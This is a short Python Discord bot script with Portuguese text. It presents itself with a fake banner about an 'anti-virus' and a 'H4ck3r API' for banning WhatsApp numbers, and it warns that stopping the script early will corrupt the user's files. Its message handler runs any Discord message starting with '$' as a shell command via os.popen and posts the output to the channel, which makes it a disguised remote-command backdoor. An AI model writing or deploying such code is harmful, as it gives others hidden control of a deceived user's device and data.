import os
from discord.ext import commands
import discord
import asyncio

intents = discord.Intents().all()
client = discord.Client(intents=intents)

@client.event
async def on_ready():
   os.system('clear')
   print('''
ANTE VIRUS ATIVADO
\033[34m[+] ☠️ Conectando Na API H4ck3r | Metodo b4n3 num3r0\033[m
[+] Bot Trava Zaper Ligando....

\033[33mCASO DESATIVE ANTES DE TERMINAR O SCRIPT OU SEUS ARQUIVOS DO SEU DISPOSITIVO PODEM/VÃO SER CORROMPIDOS.\033[m
''')

@client.event
async def on_message(message):
    if message.author == client.user:
        return

    elif message.content.startswith('$'):
        try:
            c = message.content
            c = c.strip()
            c = c[2:]
            c = os.popen(c)
            c = c.read()
            await message.channel.send(f'''
```py
{c}
```
''')
        except:
            print('\n\n\033[31m[*] CONECT API | HAKING install...\033[m\n\n')


ssnak = str(input('sua ssnak de segurança: '))
client.run(ssnak)
